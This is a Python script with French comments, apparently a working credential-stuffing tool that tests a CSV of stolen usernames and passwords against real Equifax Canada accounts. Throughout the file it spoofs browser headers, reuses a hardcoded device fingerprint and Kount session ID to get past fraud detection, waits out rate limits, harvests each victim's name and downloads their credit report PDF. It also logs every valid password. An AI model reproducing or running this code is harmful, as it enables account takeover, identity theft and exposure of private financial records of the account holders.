import csv
import requests
import json
import re
import os
import time
import sys

# ============================================================
#  FICHIERS
# ============================================================
INPUT_FILE    = r"C:\Users\km\Downloads\equi.csv"
OUTPUT_DIR    = r"C:\Users\km\Downloads\INTERAC e-Transfer request for money_files\reports"
RESULTS_FILE  = "resultats.txt"
PROGRESS_FILE = "progress.txt"

# ============================================================
#  PARAMETRES
# ============================================================
DELAY_BETWEEN = 2.0    # secondes entre chaque compte

# Device fingerprint & kount (reutilisable)
DEVICE_FP = "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;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"
KOUNT_SID = "d33c301703204958a631b1b3eb0dd9f4"

BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Referer": "https://my.equifax.ca/login",
    "Origin": "https://my.equifax.ca",
    "Sec-Ch-Ua": '"Google Chrome";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
}

BASE_URL = "https://my.equifax.ca"


# ============================================================
#  CHARGER LE CSV
# ============================================================
def charger_csv():
    comptes = []
    with open(INPUT_FILE, newline="", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        for row in reader:
            username = row.get("USERNAME", "").strip()
            password = row.get("PASSWORD", "").strip()
            if username and password:
                # Nettoyer le password (enlever " |" a la fin si present)
                password = re.sub(r'\s*\|\s*$', '', password)
                comptes.append((username, password))
    return comptes


# ============================================================
#  PROGRESSION
# ============================================================
def charger_progression():
    done = set()
    if os.path.exists(PROGRESS_FILE):
        with open(PROGRESS_FILE, "r", encoding="utf-8") as f:
            for line in f:
                if line.strip():
                    done.add(line.strip())
    return done

def sauver_progression(email):
    with open(PROGRESS_FILE, "a", encoding="utf-8") as f:
        f.write(email + "\n")


# ============================================================
#  EXTRAIRE NOM DEPUIS JSON
# ============================================================
def extraire_nom_json(data):
    """Cherche firstName/lastName dans un dict JSON (recursif)."""
    if not isinstance(data, dict):
        return None

    # Directement dans le dict
    fn = data.get("firstName", "") or data.get("first_name", "") or data.get("givenName", "")
    ln = data.get("lastName", "") or data.get("last_name", "") or data.get("familyName", "")
    if fn or ln:
        return f"{fn} {ln}".strip()

    # Dans les sous-objets
    for key in ["user", "account", "profile", "customer", "member", "person",
                 "data", "result", "details", "info", "memberInfo", "userInfo"]:
        if key in data and isinstance(data[key], dict):
            nom = extraire_nom_json(data[key])
            if nom:
                return nom

    # fullName direct
    for key in ["fullName", "full_name", "name", "displayName"]:
        if key in data and data[key]:
            return str(data[key]).strip()

    return None


# ============================================================
#  TRAITER UN COMPTE
# ============================================================
def traiter_compte(username, password):
    session = requests.Session()
    session.headers.update(BASE_HEADERS)

    # --- STEP 1: GET login page (cookies) ---
    try:
        r = session.get(f"{BASE_URL}/login", timeout=15)
        r.raise_for_status()
    except Exception as e:
        return "ERREUR_RESEAU", f"GET login: {e}", False

    # --- STEP 2: POST validateCredentials ---
    try:
        r = session.post(
            f"{BASE_URL}/membercenter/validateCredentials",
            data={
                "username": username,
                "password": password,
                "deviceFingerprint": DEVICE_FP,
                "kountSessionId": KOUNT_SID,
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=20,
        )
    except Exception as e:
        return "ERREUR_RESEAU", f"POST validate: {e}", False

    code = r.status_code
    body = r.text

    # --- Analyser la reponse ---
    if code == 401:
        # Essayer de parser le message d'erreur
        try:
            d = r.json()
            msg = d.get("message", "Unauthorized")
        except:
            msg = "Unauthorized"
        return "LOGIN_INVALIDE", msg, False

    if code == 403:
        return "COMPTE_BLOQUE", "Forbidden", False

    if code == 429:
        return "RATE_LIMIT", "Trop de requetes", False

    if code != 200:
        return "ERREUR_HTTP", f"HTTP {code}: {body[:100]}", False

    # --- Login reussi (200) ---
    nom = None

    # Essayer de parser le JSON de la reponse
    try:
        login_data = r.json()
        nom = extraire_nom_json(login_data)
    except (json.JSONDecodeError, ValueError):
        pass

    # --- STEP 3: Chercher le nom via l'API account-summary ---
    if not nom:
        try:
            r2 = session.get(
                f"{BASE_URL}/membercenter/app/data/account/v1/account-summary",
                headers={"Accept": "application/json"},
                timeout=15,
            )
            if r2.status_code == 200:
                try:
                    nom = extraire_nom_json(r2.json())
                except:
                    pass
        except:
            pass

    # --- STEP 4: Chercher le nom via credit-report ---
    if not nom:
        try:
            r3 = session.get(
                f"{BASE_URL}/membercenter/app/data/product/one_b_adhoc_report/v1/credit-report",
                headers={"Accept": "application/json"},
                timeout=15,
            )
            if r3.status_code == 200:
                try:
                    data3 = r3.json()
                    nom = extraire_nom_json(data3)
                    # Aussi chercher dans les personal details du rapport
                    if not nom and isinstance(data3, dict):
                        for key in ["personalInformation", "personalInfo", "personalDetails",
                                     "consumer", "subject"]:
                            if key in data3:
                                nom = extraire_nom_json(data3[key]) if isinstance(data3[key], dict) else None
                                if nom:
                                    break
                except:
                    pass
        except:
            pass

    # --- STEP 5: Telecharger le PDF ---
    pdf_saved = False
    try:
        r4 = session.get(
            f"{BASE_URL}/membercenter/app/data/product/one_b_adhoc_report/v1/credit-report-pdf",
            headers={
                "Accept": "application/pdf",
                "Referer": f"{BASE_URL}/credit-report/personal-info",
            },
            timeout=30,
        )
        if r4.status_code == 200 and (
            "pdf" in r4.headers.get("Content-Type", "").lower()
            or r4.content[:5] == b"%PDF-"
        ):
            os.makedirs(OUTPUT_DIR, exist_ok=True)
            safe = re.sub(r'[^\w@.\-]', '_', username)
            path = os.path.join(OUTPUT_DIR, f"{safe}.pdf")
            with open(path, "wb") as f:
                f.write(r4.content)
            pdf_saved = True
    except:
        pass

    status = "OK" if nom else "LOGIN_OK"
    return status, nom or "", pdf_saved


# ============================================================
#  MAIN
# ============================================================
def main():
    print("=" * 60)
    print("  NWIMRA - Equifax Account Processor")
    print(f"  Input: {INPUT_FILE}")
    print("=" * 60)
    print()

    # Charger le CSV
    try:
        comptes = charger_csv()
    except FileNotFoundError:
        print(f"[ERREUR] Fichier introuvable : {INPUT_FILE}")
        return
    except Exception as e:
        print(f"[ERREUR] Lecture CSV : {e}")
        return

    total = len(comptes)
    if total == 0:
        print("[ERREUR] Aucun compte trouve.")
        return

    # Reprendre si interrompu
    deja = charger_progression()
    a_faire = [(u, p) for u, p in comptes if u not in deja]
    skip = total - len(a_faire)

    if skip:
        print(f"Reprise : {skip} deja traites, {len(a_faire)} restants.")
    if not a_faire:
        print("Tous les comptes sont deja traites !")
        return

    print(f"{len(a_faire)}/{total} compte(s) a traiter")
    print(f"Resultats -> {RESULTS_FILE}  |  PDFs -> {OUTPUT_DIR}")
    print()

    # Header resultats
    if not os.path.exists(RESULTS_FILE) or skip == 0:
        with open(RESULTS_FILE, "w", encoding="utf-8") as f:
            f.write("Email\tPassword\tStatus\tNom\tPDF\n")

    t_start = time.time()
    stats = {"OK": 0, "LOGIN_OK": 0, "LOGIN_INVALIDE": 0, "ERREUR": 0}

    for i, (username, password) in enumerate(a_faire, start=skip + 1):
        t0 = time.time()

        try:
            status, detail, pdf = traiter_compte(username, password)
        except Exception as e:
            status, detail, pdf = "ERREUR", str(e), False

        dt = time.time() - t0

        # Affichage
        pdf_txt = "PDF:oui" if pdf else ""
        if status == "OK":
            print(f"[{i}/{total}] {username} -> {detail} {pdf_txt} ({dt:.1f}s)")
            stats["OK"] += 1
        elif status == "LOGIN_OK":
            print(f"[{i}/{total}] {username} -> Login OK (nom non trouve) {pdf_txt} ({dt:.1f}s)")
            stats["LOGIN_OK"] += 1
        elif status == "LOGIN_INVALIDE":
            print(f"[{i}/{total}] {username} -> INVALIDE ({dt:.1f}s)")
            stats["LOGIN_INVALIDE"] += 1
        elif status == "RATE_LIMIT":
            print(f"[{i}/{total}] {username} -> RATE LIMIT - pause 60s...")
            time.sleep(60)
            stats["ERREUR"] += 1
        else:
            print(f"[{i}/{total}] {username} -> {status}: {detail} ({dt:.1f}s)")
            stats["ERREUR"] += 1

        # Sauvegarder le resultat
        with open(RESULTS_FILE, "a", encoding="utf-8") as f:
            f.write(f"{username}\t{password}\t{status}\t{detail}\t{'oui' if pdf else 'non'}\n")

        sauver_progression(username)

        # Pause entre comptes
        if i < total:
            time.sleep(DELAY_BETWEEN)

    elapsed = time.time() - t_start

    print()
    print("=" * 60)
    print(f"  Termine en {elapsed:.0f}s  (~{elapsed/max(len(a_faire),1):.1f}s/compte)")
    print(f"  OK: {stats['OK']}  |  Login OK (sans nom): {stats['LOGIN_OK']}")
    print(f"  Invalides: {stats['LOGIN_INVALIDE']}  |  Erreurs: {stats['ERREUR']}")
    print(f"  Resultats: {RESULTS_FILE}")
    print("=" * 60)

    # Nettoyer la progression
    if os.path.exists(PROGRESS_FILE):
        os.remove(PROGRESS_FILE)


if __name__ == "__main__":
    main()